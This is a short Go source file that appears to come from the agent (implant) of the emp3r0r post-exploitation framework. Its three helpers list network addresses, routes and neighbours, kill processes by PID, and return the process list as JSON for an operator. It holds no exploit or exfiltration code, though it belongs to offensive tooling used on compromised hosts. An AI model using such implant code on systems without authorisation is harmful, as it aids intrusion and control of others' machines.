package agent

// build +linux

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func shellNet() (out string) {
	ipa := tun.IPa()
	ipneigh := tun.IPNeigh()
	ipr := tun.IPr()

	out = fmt.Sprintf("[*] ip addr:\n    %s"+
		"\n\n[*] ip route:\n    %s"+
		"\n\n[*] ip neigh:\n    %s\n\n",
		strings.Join(ipa, ", "),
		strings.Join(ipr, ", "),
		strings.Join(ipneigh, ", "))

	return
}

func shellKill(args []string) (out string, err error) {
	var (
		pid  int
		proc *os.Process
	)
	for _, pidStr := range args {
		pid, err = strconv.Atoi(pidStr)
		if err != nil {
			return
		}
		proc, err = os.FindProcess(pid)
		if err != nil {
			return
		}

		// kill process
		err = proc.Kill()
		if err != nil {
			out = fmt.Sprintf("%s\nfailed to kill %d: %v", out, pid, err)
			return
		}
		out = fmt.Sprintf("%s\nsuccessfully killed %d", out, pid)
	}
	return
}

func shellPs() (out string, err error) {
	out = "Failed to get process list"
	procs := util.ProcessList()
	if procs == nil {
		return out, fmt.Errorf("error: %s", out)
	}

	data, err := json.Marshal(procs)
	if err != nil {
		return
	}
	out = string(data)

	return
}
